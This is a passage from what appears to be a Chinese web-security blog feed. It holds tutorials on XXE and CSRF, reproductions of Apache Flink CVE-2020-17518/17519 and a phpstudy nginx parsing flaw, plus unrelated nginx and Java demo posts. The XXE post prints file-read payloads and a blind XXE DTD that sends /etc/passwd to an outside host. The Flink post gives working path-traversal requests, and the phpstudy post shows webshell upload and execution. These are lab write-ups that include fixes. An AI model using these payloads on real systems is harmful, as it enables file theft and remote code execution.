class="line">  if [`ps -C nginx --no-header| wc -1` -eq 0 ];then</span><br><span class="line">    killall keepalived</span><br><span class="line">  fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><code>systemctl start keepalived </code></p><p>启动nginx&#x2F;keepalived</p><p><code> ps -ef | grep keepalived</code></p><p><img src="https://b3logfile.com/file/2020/10/image-f5fd1a7e.png"></p><p>查看虚拟IP</p><p><img src="https://b3logfile.com/file/2020/10/image-40331343.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-2a64b551.png" alt="image.png"></p><p>关闭nginx服务</p><p><img src="https://b3logfile.com/file/2020/10/image-3c37ae5b.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-8a0abd3c.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞原理及简单利用</title>
      <link href="/posts/18655/"/>
      <url>/posts/18655/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h3><hr><p>XXE注入，即XML External Entity，XML外部实体注入。通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><h3 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h3><hr><p>XML可以从外部读取DTD文件的话，那么就可以想一下，如果把读取文件的路径换成另一个文件的路径，那么是否可以读取到这个文件。如果把路径指向一个内网端口，是否能探测内部端口。另外，服务器解析XML，要么一次性加载，要么是一部分一部分的去加载，递归调用XML定义，一次性调用超量的定义，那么服务器内存就会消耗光，造成拒绝服务攻击。</p><ul><li>读取文件</li><li>命令执行</li><li>内网探测</li><li>DDOS攻击</li><li>钓鱼</li></ul><h3 id="简单XXE漏洞代码编写"><a href="#简单XXE漏洞代码编写" class="headerlink" title="简单XXE漏洞代码编写"></a>简单XXE漏洞代码编写</h3><hr><ol><li>常用函数介绍</li></ol><p>file_get_contents()函数把整个文件读入一个字符串中</p><p>php:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>simplexml_load_string函数</p><p>将xml格式字符串转换为对应的simpleXMLElement</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$note</span>=<span class="string">&lt;&lt;&lt;XML</span></span><br><span class="line"><span class="string">&lt;note&gt;&lt;name&gt;aaa&lt;/name&gt;&lt;age&gt;12&lt;/age&gt;&lt;/note&gt;</span></span><br><span class="line"><span class="string">XML</span>;</span><br><span class="line"><span class="variable">$xml</span>=<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$note</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$xml</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>XML注入回显 输出函数</p><p>print_r()</p><p>编写简单的XXE漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$xml</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);  <span class="comment">//有回显</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>eg.</p><p>环境搭建</p><p><img src="https://b3logfile.com/file/2020/10/image-33b70112.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-a76cda90.png" alt="image.png"></p><p>读取本地文件payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>使用bp抓包</p><p><img src="https://b3logfile.com/file/2020/10/image-beb7584b.png" alt="image.png"></p><p>修改请求方式，上传payload，读取C盘下的Windows.ini这个文件</p><p><img src="https://b3logfile.com/file/2020/10/image-dbd01e8f.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-1a5186d6.png" alt="image.png"></p><p>成功读取到这个文件。</p><h3 id="漏洞利用-任意文件读取"><a href="#漏洞利用-任意文件读取" class="headerlink" title="漏洞利用-任意文件读取"></a>漏洞利用-任意文件读取</h3><p>php中测试POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///path/to/file.txt</span><br><span class="line">http://url/file.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=conf.php</span><br></pre></td></tr></table></figure><p>读取文件（有回显）</p><p>paylaod</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/test/flag.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/file/2020/10/image-70693e73.png" alt="image.png"></p><p>读取php文件</p><p><img src="https://b3logfile.com/file/2020/10/image-868045af.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-325e35d3.png" alt="image.png"></p><p>读取文件（无回显）</p><p><code>print_r($data); </code>输出了我们查询的结果，如果没有这个函数的话，只有使用Blind XXE来构建一条带外信道提取数据。</p><p><img src="https://b3logfile.com/file/2020/10/image-ded7f0f7.png" alt="image.png"></p><p>请求服务器，服务器会再次向我们搭建的服务器请求dtd文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://192.168.73.134/test.dtd&quot;&gt;</span><br><span class="line">&lt;foo&gt;&amp;e1;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>构造服务器的dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &#x27;http://192.168.73.134/test.php?con=%p1;&#x27;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure><p>服务器请求到这个dtd之后，会开始解析。然后把得到的密码通过请求参数再次访问我们的服务器，从而造成数据外带，我们可以通过抓包获取到信息。</p><h3 id="XXE漏洞发现与防御"><a href="#XXE漏洞发现与防御" class="headerlink" title="XXE漏洞发现与防御"></a>XXE漏洞发现与防御</h3><p>抓包引用外部实体来探测是否存在XXE漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> <span class="string">&quot;This is test&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如何防御？</p><ul><li>禁用外部实体</li><li>过滤用户提交的参数（XML的关键词）</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><blockquote><p><a href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a></p><p><a href="https://www.freebuf.com/column/181064.html">https://www.freebuf.com/column/181064.html</a></p><p><a href="https://pentesterlab.com/exercises/play_xxe/course">https://pentesterlab.com/exercises/play_xxe/course</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈CSRF漏洞原理</title>
      <link href="/posts/26169/"/>
      <url>/posts/26169/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h3><p>跨站请求伪造（Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</p><p><strong>CSRF和XSS的区别</strong></p><ul><li>xss利用站点内的信任用户，盗取cookie。</li><li>csrf通过伪装成受信任用户请求受信任网站</li></ul><h3 id="CSRF漏洞原理"><a href="#CSRF漏洞原理" class="headerlink" title="CSRF漏洞原理"></a>CSRF漏洞原理</h3><p>一个用户正常访问登陆一个网站（A）之后，用户会存下A的cookie。当用户未退出网站并在同一浏览器中去访问恶意网站（B）。B发出向A的请求，浏览器接收到这个请求之后，会带上A的cookie去请求A。A不知道这是B的恶意请求，会根据用户的cookie信息和权限处理这个请求，这样就导致B的恶意请求被执行。</p><p><img src="https://b3logfile.com/file/2020/10/image-9a7d4dd3.png" alt="image.png"></p><p>利用目标用户的合法身份，以目标用户的名义执行某些非法的操作。</p><p><strong>eg.</strong></p><p>假设去登陆一个网站</p><p><img src="https://b3logfile.com/file/2020/10/image-0960c913.png" alt="image.png"></p><p>登陆成功之后，我们这个用户拥有更改密码的权限。</p><p><img src="https://b3logfile.com/file/2020/10/image-28b85a04.png" alt="image.png"></p><p>更改密码</p><p><img src="https://b3logfile.com/file/2020/10/image-d6e7e5ca.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2020/10/image-76ea3776.png" alt="image.png"></p><p>这就是浏览正常网站的操作流程。</p><p>修改密码的链接 <a href="">http://localhost//testinfo/update.php?user=aaa&amp;passwd=456</a></p><p>构造恶意链接<a href=""> http://localhost//testinfo/update.php?user=aaa&amp;passwd=123456</a></p><p>然后我们在去访问这个恶意链接</p><p><img src="https://b3logfile.com/file/2020/10/image-df4ab9e7.png" alt="image.png"></p><p><em>代码示例</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//会话验证cookie 确保用户登陆</span></span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;passwd&quot;</span>];</span><br><span class="line"><span class="comment">//更改密码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>CSRF利用条件</strong></p><ul><li>用户已经登陆</li><li>用户访问对应url</li></ul><h3 id="漏洞利用的一些技巧"><a href="#漏洞利用的一些技巧" class="headerlink" title="漏洞利用的一些技巧"></a>漏洞利用的一些技巧</h3><ol><li>链接利用</li><li>img标签利用</li><li>iframe利用</li><li>css-background利用</li></ol><blockquote><p>iframe标签内容将在页面加载过程中自动进行加载，src指向的位置就是页面请求的地址。</p></blockquote><blockquote><p>注意：iframe加载会出现白框，可以设置iframe的style-&gt;display：none，来不显示iframe加载内容。</p></blockquote><p>可以利用css中background样式中的url来加载远程机器上的内容，从而对url中的内容发送http请求。</p><p>eg.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>:<span class="number">#00FF00</span> <span class="built_in">url</span>(<span class="string">a.gif</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PSOT型CSRF可以设置表单用于提交，使用hidden属性来隐藏。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;user&quot; value=&quot;123456&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="CSRF防御措施"><a href="#CSRF防御措施" class="headerlink" title="CSRF防御措施"></a>CSRF防御措施</h3><ul><li>二次验证（js验证）取决于用户，不建议使用</li><li>http referer头</li><li>设置token</li><li>http自定义头</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Flink（CVE-2020-17518&amp;&amp;CVE-2020-17519）漏洞复现</title>
      <link href="/posts/40618/"/>
      <url>/posts/40618/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><strong>CVE-2020-17518：通过REST API写入远程文件</strong></p><p>影响版本：Flink 1.5.1-1.11.2</p><p>Flink 1.5.1引入了REST API，可通过修改HTTP HEADER将任意文件写入到文件系统的任意位置。</p><p><strong>CVE-2020-17519：通过REST API读取远程文件</strong></p><p>影响版本 Flink 1.11.0-1.11.2</p><p>Flink 1.11.0-1.11.2中引入的一项更改，允许攻击者通过JobManager进程的REST接口读取本地文件系统上的任何文件，访问仅限于JobManager可访问的文件。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载vulhub</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure><p>进入目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/flink/CVE-2020-17518</span><br></pre></td></tr></table></figure><p>安装环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/file/2021/01/image-e7124b46.png" alt="image.png"></p><p>访问</p><p><img src="https://b3logfile.com/file/2021/01/image-9cddfee5.png" alt="image.png"></p><p>这里版本为1.11.2</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>CVE-2020-17518复现</strong></p><p>构造数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /jars/upload HTTP/1.1</span><br><span class="line">Host: your ip:8081</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 192</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;../../../../../../tmp/flag&quot;</span><br><span class="line"></span><br><span class="line">This is flag </span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/file/2021/01/image-4733072e.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2021/01/image-848c825c.png" alt="image.png"></p><p>也可以通过CVE-2020-17519来进行读取</p><p><strong>CVE-2020-17519复现</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your ip:8081//jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fflag</span><br></pre></td></tr></table></figure><p><code>%252f</code> 是 <code>/</code> 的二次编码</p><p>直接访问可读取到文件信息</p><p><img src="https://b3logfile.com/file/2021/01/image-8a74e05a.png" alt="image.png"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到安全版本</p><p>Flink 1.11.3或Flink 1.12.0</p><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://lists.apache.org/thread.html/rb43cd476419a48be89c1339b527a18116f23eec5b6df2b2acbfef261%40%3Cdev.flink.apache.org%3E">https://lists.apache.org/thread.html/rb43cd476419a48be89c1339b527a18116f23eec5b6df2b2acbfef261%40%3Cdev.flink.apache.org%3E</a><br><a href="https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d%40%3Cdev.flink.apache.org%3E">https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d%40%3Cdev.flink.apache.org%3E</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy_nginx 解析漏洞</title>
      <link href="/posts/19714/"/>
      <url>/posts/19714/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>2020年09月03日，360CERT监测发现 phpstudy 发布了 phpstudy 安全配置错误漏洞 的风险通告，漏洞等级：高危，漏洞评分：7.6。</p><p>phpStudy 存在 nginx 解析漏洞，攻击者能够利用上传功能，将包含恶意代码的合法文件类型上传至服务器，从而造成任意代码执行的影响。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>phpstudy:phpstudy : &lt;&#x3D;8.1.0.7</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>主要是nginx配置不当造成的解析漏洞，与php、nginx版本无关，但在高版本的php中，由于“security.limit_extensions”的引入，使得该漏洞难以被成功利用。</p><p>环境配置如下（win10 + phpstudy）</p><p><img src="https://b3logfile.com/file/2020/11/image-292148ed.png" alt="image.png"></p><p>写一个文件上传页面上传文件(html+php)</p><p><img src="https://b3logfile.com/file/2020/11/image-7d89efa0.png" alt="image.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上传图片马，<code>copy 1.jpg/b + tset.php/a webshell.jpg </code>这个命令制作完成后有点问题，所以直接更改php的后缀，也可以在网上找图片马。</p><p><img src="https://b3logfile.com/file/2020/11/image-f492fef6.png" alt="image.png"></p><p><img src="https://b3logfile.com/file/2020/11/image-37ac7baf.png" alt="image.png"></p><p>这里得到了图片存储的路径，然后访问这张图片 <code>http://192.168.73.146/upload/test.jpg</code></p><p><img src="https://b3logfile.com/file/2020/11/image-be3ca030.png" alt="image.png"></p><p>直接使用paylaod <code>http://192.168.73.146/upload/test.jpg/xxx.php</code>造成解析漏洞</p><p><img src="https://b3logfile.com/file/2020/11/image-d2a9dfb3.png" alt="image.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>http://192.168.73.146/upload/test.jpg/xxx.php </code> 访问一个不存在的php文件为什么对上一层的jpg文件进行了解析？既然是配置不当，就去看看它们的配置文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen        80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">        root   &quot;C:/phpstudy_pro/WWW&quot;;</span><br><span class="line">        location / &#123;</span><br><span class="line">            index index.php index.html;</span><br><span class="line">            error_page 400 /error/400.html;</span><br><span class="line">            error_page 403 /error/403.html;</span><br><span class="line">            error_page 404 /error/404.html;</span><br><span class="line">            error_page 500 /error/500.html;</span><br><span class="line">            error_page 501 /error/501.html;</span><br><span class="line">            error_page 502 /error/502.html;</span><br><span class="line">            error_page 503 /error/503.html;</span><br><span class="line">            error_page 504 /error/504.html;</span><br><span class="line">            error_page 505 /error/505.html;</span><br><span class="line">            error_page 506 /error/506.html;</span><br><span class="line">            error_page 507 /error/507.html;</span><br><span class="line">            error_page 509 /error/509.html;</span><br><span class="line">            error_page 510 /error/510.html;</span><br><span class="line">            autoindex  off;</span><br><span class="line">        &#125;</span><br><span class="line">        location ~ \.php(.*)$ &#123;</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_split_path_info  ^((?U).+\.php)(/?.+)$;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            fastcgi_param  PATH_INFO  $fastcgi_path_info;</span><br><span class="line">            fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过正则找到php文件并把它交给fastcgi处理,<code>fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</code> 这个配置的意思是在浏览器中访问.php文件，读取$document_root（网站根目录）下的.php文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问此URL http://192.168.73.146/upload/test.jpg/xxx.php </span><br><span class="line">nginx 传递给fastcgi的值 /../../upload/test.jpg/xxx.php</span><br></pre></td></tr></table></figure><p>这里怎么访问了上层的test.jpg文件呢？在fastcgi处理xxx.php这个文件的时候，发现没有这个php文件，这时 <code>php.ini</code> 配置文件中 <code>cgi.fix_pathinfo=1</code> 这个参数就会修复路径，采用上层的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">假设一个路径,cgi依次检查</span><br><span class="line">/../../upload/test.jpg/xxx.php/aaa.php/bbb.php</span><br><span class="line">/../../upload/test.jpg/xxx.php/aaa.php</span><br><span class="line">/../../upload/test.jpg/xxx.php</span><br><span class="line">/../../upload/test.jpg</span><br></pre></td></tr></table></figure><p>到了这里 <code>fastcgi_param  SCRIPT_FILENAME</code> 就成了 <code>/../../upload/test.jpg</code> </p><p><img src="https://b3logfile.com/file/2020/11/image-37f7410c.png" alt="image.png"></p><p>所以访问 <code>http://192.168.73.146/upload/test.jpg/xxx.php</code> 实际上变成了 <code>http://192.168.73.146/upload/test.jpg</code> 并当成了php文件执行。</p><p>在是php-fpm.conf中的 <code>security.limit_extensions</code>配置了fastcgi解析文件的类型，如果默认为空那么是什么类型的文件就执行什么类型的文件。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li>将php.ini文件中的cgi.fix_pathinfo的值设置为0，这样它就不会修复路径，你访问xxx.php这个不存在的文件时就会显示此文件不存在。</li><li>php-fpm.conf中的security.limit_extensions后面的值设置为.php。</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="">https://blog.csdn.net/ll641058431/article/details/53350305</a></p><p><a href="https://www.laruence.com/2010/05/20/1495.html">https://www.laruence.com/2010/05/20/1495.html</a></p><p><a href="https://www.cnblogs.com/yuzly/p/11208742.html">https://www.cnblogs.com/yuzly/p/11208742.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpstudy </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>疫情地图_Demo</title>
      <link href="/posts/21594/"/>
      <url>/posts/21594/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>疫情期间的Demo，面向零基础，从代码编写到项目部署，在此记录一下学习过程，巩固一下知识。</p><p>使用到的工具如下</p><ul><li>IDEA</li><li>阿里云服务器</li></ul><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><p>java代码编写，疫情期间网上公布着世界的人数感染情况，这些数据是从何而来？网易、丁香园这些数据并不是他们自己做出来的，而是通过实时收集数据，每个省上报的人数进行统计、汇总并进行公布。这时就有了固定的数据接口供大家使用，这种API接口挺多的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">package com.jh2ng.demo2;</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLConnection;</span><br><span class="line"></span><br><span class="line">public class Demo1 &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        //创建URL对象</span><br><span class="line">        URL u1 = new URL(&quot;https://zaixianke.com/yq/all&quot;); //调API</span><br><span class="line">        //建立连接</span><br><span class="line">        URLConnection con = u1.openConnection();</span><br><span class="line">        //获取数据流</span><br><span class="line">        InputStream is = con.getInputStream();</span><br><span class="line">        